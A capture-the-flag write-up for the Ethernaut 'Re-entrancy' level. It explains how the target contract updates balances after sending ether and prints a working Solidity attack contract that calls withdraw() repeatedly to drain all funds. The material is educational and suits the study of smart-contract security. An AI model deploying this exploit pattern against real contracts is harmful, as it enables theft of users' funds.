<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel10.svg">

# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```
Challenge's message.

>The goal of this level is for you to steal all the funds from the contract.Things that might help:
Untrusted contracts can execute code where you least expect it.
Fallback methods
Throw/revert bubbling
Sometimes the best way to attack a contract is with another contract.

We have a basic smart contract that performs the banking function. The first thing we look at is it uses the SafeMath library for the type of uint256 variables because of prevents Integer Underflow vulnerability. Also, it has a defined public mapping named **balances** to document the address's balances in the contract. After that, there is **donate()** function to increase the address's balance. And then, we can learn someone's balance with the help of **balanceOf()** method. And finally, we have **withdraw()** function to withdraw the amount from our balance. 

However, there is something in the crash. We will talk about the next part :> In the end of the code, there is a candy. Usually, **receive()** functions are used to get ether for the contract with the low-level contract interaction. In this case, it is left blank. Why?

# Subverting

When we look at the target code from the hacker's perspective, we can clearly show in the withdraw function; the contract updated the balance after sending the amount to the user's address. What's wrong? In the design pattern, devs might think that contract always sends the amount to the user balance only once. Hereby, updating works correctly. But, in the end of the code a **receive()** function which is payable and left bank. It helps us to low level interaction to our attack contract when we want get some ether more. What is more, if we abuse this case to send ether to our address more than once, what will happen?

The entire amount in the contract will be transferred to the attacker's account. Brainful, isn't it? I explained this vulnerability so detail in my [reentrancy repository](https://github.com/wasny0ps/Reentrancy). I strongly recommend this article to understand reentrancy more clearly and learn how to prevent this vulnerability. Let's look our attack contract.

```solidity
pragma solidity ^0.8.17;

interface IReentrancy{

    function donate(address _to) external payable;
    function withdraw(uint _amount) external;

}

contract Attack{

    IReentrancy target;

    constructor(address  _target) {
        target = IReentrancy(_target);
    }

    function attack() external payable{
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive()external payable{
        if(address(target).balance >= 0.001 ether){
            target.withdraw(0.001 ether);
        }
    }
}
```
Before explain our attack contract, check target contract's balance.
```shell
await getBalance(contract.address)
'0.001'
```
We learned entire amouunt in target contract as **0.001 ether**. Let's convert it to wei.

```shell
await web3.utils.toWei('0.001','ether')
1000000000000000
```
After converting it to wei, it's time to explain the attack contract. First of all, this contract is a little bit different than other attack contracts. Because we used the **interface()** method to interact with other contracts easily. Also, before you use the interface, you must add into the interface method the same functions which are in the contract that we want to interact with. Otherwise, you will get an error. That's why, we use an interface to interact with the target contract. After that, get an instance of the target contract with enter the target contract's address in the constructor. 

In the **attack()** contract, it calls donate function and adds some value to our address's balance. In the next step, get ether back from the target contract. When the target contract sends **msg.value** to our attack contract, our **receive()** function welcomes the transaction. And then it calls **withdraw()** function again and again until target's balance less equal than 0.001 ether. While this process, target contract won't be updated the new balance. Thus, we get all money from the target contract. 🤑 

Let's bum out. Deploy the attack contract.

<img width="300" src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Re-entracy/img/deploy.png">

Call attack function with sending 1000000000000000 wei.
<img width="300" src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Re-entracy/img/attack.png">

And show our hack.

<img width="300" src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Re-entracy/img/result.png">
